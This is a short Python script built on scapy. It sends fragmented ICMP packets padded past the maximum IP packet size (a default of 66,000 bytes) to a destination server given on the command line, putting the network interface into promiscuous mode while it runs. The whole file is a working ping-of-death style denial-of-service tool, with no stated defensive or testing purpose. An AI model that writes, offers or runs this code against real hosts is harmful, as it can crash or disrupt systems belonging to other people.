#!/usr/bin/python
# This script is "quick and dirty" and is not meant to handle all possibilities and exceptions.
# No input validation is performed. Ignore the tcpdump error when running
from random import randrange
from optparse import OptionParser
import socket
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * 
conf.verb = 0

def promisc(state):
#Manage interface promiscuity. valid states are on or off
        ret =  os.system("ip link set " + conf.iface + " promisc " + state)
        if ret == 1:
                print ("You must run this script with root permissions.")

# Parse options
usage = "usage: %prog [options] arg1 arg2"
parser = OptionParser(usage=usage)
parser.add_option("-s", "--size", type="int", dest="size", default="66000", help="Counter for how many bytes to send. If not specified, default is 66000.")
parser.add_option("-d", "--dest", dest="server", help="Destination server")
(options, args) = parser.parse_args()

# Initialize default values and determine interfce IP that will be sending to server
pkt= IP(dst=options.server)
client = pkt.src
promisc("on")

for pkt in fragment(IP(dst=options.server)/ICMP()/("X"*options.size)):
	send(pkt)
promisc("off")
